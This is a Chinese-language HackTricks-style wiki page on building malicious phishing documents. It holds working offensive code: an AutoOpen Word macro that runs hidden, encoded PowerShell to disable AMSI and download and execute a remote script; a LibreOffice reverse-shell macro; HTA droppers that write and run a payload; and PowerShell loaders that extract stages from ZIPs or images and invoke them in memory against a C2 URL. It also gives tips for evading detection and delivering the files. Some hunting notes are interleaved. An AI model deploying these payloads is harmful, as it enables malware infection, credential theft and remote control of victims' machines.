# Phishing 文件与文档

{{#include ../../banners/hacktricks-training.md}}

## Office 文档

Microsoft Word 在打开文件之前会执行文件数据验证。数据验证以数据结构识别的形式进行，并依据 OfficeOpenXML 标准。如果在数据结构识别过程中发生任何错误，则不会打开正在分析的文件。

通常，包含宏的 Word 文件使用 `.docm` 扩展名。不过，可以通过更改文件扩展名来重命名文件，同时保留其宏执行能力。\
例如，RTF 文件在设计上不支持宏，但将 DOCM 文件重命名为 RTF 后，Microsoft Word 仍会处理该文件，并能够执行宏。\
相同的内部机制也适用于 Microsoft Office Suite 中的所有软件（Excel、PowerPoint 等）。

你可以使用以下命令检查某些 Office 程序将执行哪些扩展名：
```bash
assoc | findstr /i "word excel powerp"
```
引用远程模板的 DOCX 文件（File –Options –Add-ins –Manage: Templates –Go）如果该模板包含 macros，也可以“执行” macros。

### External Image Load

转到：_Insert --> Quick Parts --> Field_\
_**Categories**：Links and References，**Filed names**：includePicture，**Filename or URL**：_ http://<ip>/whatever

![Office Documents - External Image Load：转到：Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

可以使用 macros 从文档中运行任意代码。

#### Autoload functions

它们越常见，被 AV 检测到的可能性就越高。

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 手动删除元数据

转到 **File > Info > Inspect Document > Inspect Document**，这将打开 Document Inspector。点击 **Inspect**，然后点击 **Document Properties and Personal Information** 旁边的 **Remove All**。

#### Doc Extension

完成后，选择 **Save as type** 下拉菜单，将格式从 **`.docx`** 更改为 Word 97-2003 **`.doc`**。\
这样做是因为**无法将宏保存在 `.docx` 中**，并且启用宏的 **`.docm`** 扩展名存在**污名**（例如，缩略图图标上有一个巨大的 `!`，而且某些 web/email gateway 会完全拦截它们）。因此，这个**旧版 `.doc` 扩展名是最佳折中方案**。

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer 文档可以嵌入 Basic macros，并通过将宏绑定到 **Open Document** 事件（Tools → Customize → Events → Open Document → Macro…）来在文件打开时自动执行它们。<sup>[[1]](#references)</sup>一个简单的 reverse shell macro 如下：
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
注意字符串中的双引号（`""`）——LibreOffice Basic 使用它们来转义字面量引号，因此以 `...==""")` 结尾的 payloads 会保持内部命令和 Shell 参数的引号配对。

Delivery tips：

- 保存为 `.odt`，并将 macro 绑定到 document event，使其在打开时立即触发。
- 使用 `swaks` 发送邮件时，使用 `--attach @resume.odt`（必须带 `@`，这样发送的附件才是文件字节，而不是文件名字符串）。当滥用接受任意 `RCPT TO` recipients 且不进行验证的 SMTP servers 时，这一点至关重要。

## HTA Files

HTA 是一种 Windows 程序，**结合了 HTML 和 scripting languages（例如 VBScript 和 JScript）**。它生成用户界面，并作为“fully trusted”应用程序执行，不受 browser security model 的限制。

HTA 使用 **`mshta.exe`** 执行，该程序通常会与 **Internet Explorer** 一起**安装**，因此 **`mshta` 依赖 IE**。如果 IE 已被卸载，HTA 将无法执行。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## 强制 NTLM Authentication

有多种方式可以**远程强制 NTLM Authentication**，例如，可以在用户将访问的电子邮件或 HTML 中添加**不可见图像**（甚至 HTTP MitM？）。或者向受害者发送**文件地址**，仅仅**打开文件夹**就会**触发**一次**Authentication**。

**在以下页面中查看这些思路及更多内容：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

不要忘记，你不仅可以窃取 hash 或 Authentication，还可以**执行 NTLM relay attacks**：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads（fileless chain）

高效的 campaign 会发送一个 ZIP，其中包含两个合法的诱饵文档（PDF/DOCX）和一个恶意 .lnk。其关键在于，实际的 PowerShell loader 存储在 ZIP 的原始字节中、一个唯一 marker 之后，而 .lnk 会提取并完全在内存中运行它。<sup>[[2]](#references)</sup>

.lnk PowerShell one-liner 实现的典型流程：

1) 在常见路径中定位原始 ZIP：Desktop、Downloads、Documents、%TEMP%、%ProgramData% 以及当前工作目录的父目录。
2) 读取 ZIP 字节并查找硬编码的 marker（例如 xFIQCV）。marker 之后的所有内容都是嵌入的 PowerShell payload。
3) 将 ZIP 复制到 %ProgramData%，在那里解压，然后打开诱饵 .docx 以显得合法。
4) 绕过当前进程的 AMSI：[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 对下一阶段进行 Deobfuscate（例如删除所有 # 字符），并在内存中执行。

用于提取并运行嵌入阶段的 PowerShell skeleton 示例：
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
说明
- Delivery 经常滥用信誉良好的 PaaS 子域名（例如 *.herokuapp.com），并可能对 payloads 设置门控机制（根据 IP/UA 提供无害的 ZIP）。
- 下一阶段通常会解密 base64/XOR shellcode，并通过 Reflection.Emit + VirtualAlloc 执行，以尽量减少磁盘痕迹。

同一链路中使用的 Persistence
- 劫持 Microsoft Web Browser control 的 COM TypeLib，使 IE/Explorer 或任何嵌入该控件的应用自动重新启动 payload。<sup>[[2]](#references)[[4]](#references)</sup> 详细信息和可直接使用的命令见此处：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- 包含 ASCII 标记字符串（例如 xFIQCV）的 ZIP 文件，该字符串被追加到归档数据末尾。
- 会枚举父目录/用户文件夹以定位 ZIP，并打开诱饵文档的 .lnk。
- 通过 [System.Management.Automation.AmsiUtils]::amsiInitFailed 进行 AMSI tampering。
- 持续时间较长的业务线程，最终以托管在可信 PaaS 域名下的链接结束。

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

另一种反复出现的模式是一个**伪装成文档的 `.lnk`**，它会立即打开无害的诱饵，同时在后台分阶段执行真实链路。<sup>[[3]](#references)</sup>

观察到的工作流程：
1. 该快捷方式**伪装成 PDF**，并使用 `conhost.exe` 或类似的 proxy 来生成经过 obfuscated 的 PowerShell downloader。
2. PowerShell 会拆分明显的 tokens（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`），因此针对 `iwr`、`gci`、`ren`、`cpi` 或 `schtasks` 的简单 detections 会漏掉该命令。
3. stager 会**先下载诱饵文档**并为受害者打开，然后在后台重建恶意文件。
4. Payloads 可能会使用**无关扩展名**写入，之后通过删除填充字符进行重命名，从而延迟明显 `.exe` / `.cpl` artifacts 的出现。
5. 通过一个**按分钟运行的 scheduled task**建立 Persistence，该任务从用户可写路径启动可信 host binary。

该模式的最少 Hunting 线索：
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
一个值得识别的 staging 布局是：
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` 或 `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 为什么第二阶段具有隐蔽性

在 Rapid7 的案例研究中，scheduled task 会反复从 `C:\Users\Public\` 启动 **`Fondue.exe`**。由于 **`APPWIZ.cpl`** 被放置在其旁边，并导出了 **`RunFODW`**，这个受信任的 Microsoft binary 会 side-load 攻击者的 CPL，而不是合法的系统副本。

随后，CPL 会：
- 从 `C:\Windows\Tasks\editor.dat` 读取 **AES-256-CBC** blob
- 通过 **Windows CNG / `bcrypt.dll`** 对其进行解密
- 分配可执行内存，并复制解密后的 shellcode
- 将 shellcode 指针作为 **`EnumUILanguagesW`** 的 callback，通过间接方式执行它

最后这一步值得单独进行 hunting：malware 通常不会直接执行 `((void(*)())buf)()` 跳转，而是滥用一个**接收 callback 的合法 WinAPI**来转移执行流。

该 campaign 中的解密 payload 是 **Donut** shellcode。随后，它会完全在内存中映射最终的 PE，并在当前进程中 patch **AMSI/WLDP/ETW**，然后移交执行。有关 side-loading 和 memory-resident post-processing 的更深入说明，请参阅：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

实用的 hunting 切入点：
- `.lnk` 启动 `powershell.exe` 或 `conhost.exe`，随后显示 decoy 文档。
- 短暂下载到 **`C:\Users\Public\`**，随后立即将无意义扩展名的文件重命名。
- 使用 `GoogleErrorReport` 等普通名称，并从**用户可写目录**执行的 scheduled tasks。
- 受信任的 binaries 从同一个非系统目录加载 **`.cpl` / `.dll`** 文件。
- 写入 **`C:\Windows\Tasks\`** 下的 Base64 文本 blobs，随后由 side-loaded module 读取。

## 图像中由 Steganography 分隔的 payload（PowerShell stager）

近期的 loader chains 会传递经过 obfuscation 的 JavaScript/VBS，解码并运行 Base64 PowerShell stager。该 stager 会下载一张图像（通常是 GIF），其中包含一份以纯文本形式隐藏在唯一 start/end markers 之间的 Base64-encoded .NET DLL。脚本会搜索这些 delimiters（在实际攻击中观察到的示例：«<<sudo_png>> … <<sudo_odt>>>»），提取其中的文本，进行 Base64 解码得到 bytes，在内存中加载 assembly，并使用 C2 URL 调用已知的 entry method。<sup>[[5]](#references)</sup>

工作流程
- Stage 1：Archived JS/VBS dropper → 解码嵌入的 Base64 → 使用 `-nop -w hidden -ep bypass` 启动 PowerShell stager。
- Stage 2：PowerShell stager → 下载图像，提取由 markers 分隔的 Base64，在内存中加载 .NET DLL，并调用其 method（例如 VAI），传入 C2 URL 和 options。
- Stage 3：Loader 获取最终 payload，通常通过 process hollowing 将其注入受信任的 binary（常见的是 MSBuild.exe）。<sup>[[7]](#references)[[8]](#references)</sup> 有关 process hollowing 和 trusted utility proxy execution 的更多信息，请参阅：

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

从图像中提取 DLL 并在内存中调用 .NET method 的 PowerShell 示例：

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

备注
- 这是 ATT&CK T1027.003（steganography/marker-hiding）。<sup>[[6]](#references)</sup> 不同 campaign 使用的 markers 可能不同。
- 在加载 assembly 之前，通常会先应用 AMSI/ETW bypass 和 string deobfuscation。
- Hunting：扫描已下载的 images，查找已知 delimiters；识别访问 images 并立即解码 Base64 blobs 的 PowerShell。

另请参阅 stego tools 和 carving techniques：

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

常见的 initial stage 是一个体积很小且经过高度 obfuscation 的 `.js` 或 `.vbs` 文件，通常包含在 archive 中。其唯一目的，是解码嵌入的 Base64 string，并使用 `-nop -w hidden -ep bypass` 启动 PowerShell，通过 HTTPS 引导 next stage。<sup>[[5]](#references)</sup>

逻辑骨架（抽象）：
- 读取自身文件内容
- 在 junk strings 之间定位 Base64 blob
- 将其解码为 ASCII PowerShell
- 使用 `wscript.exe`/`cscript.exe` 调用 `powershell.exe` 执行

Hunting 线索
- Archive 中的 JS/VBS attachments 在 command line 中使用 `-enc`/`FromBase64String` 并生成 `powershell.exe`。
- `wscript.exe` 从 user temp paths 启动 `powershell.exe -nop -w hidden`。

## 用于窃取 NTLM hashes 的 Windows 文件

查看关于 **窃取 NTLM creds 的位置** 的页面：

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign：针对美国公司的复杂 Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode：通过以中国为主题的 Loader Chain 跟踪 Dropping Elephant Tradecraft](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – 新的 COM persistence technique（CICADA8）](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader 交付多种 Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography（T1027.003）](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing（T1055.012）](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild（T1127.001）](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
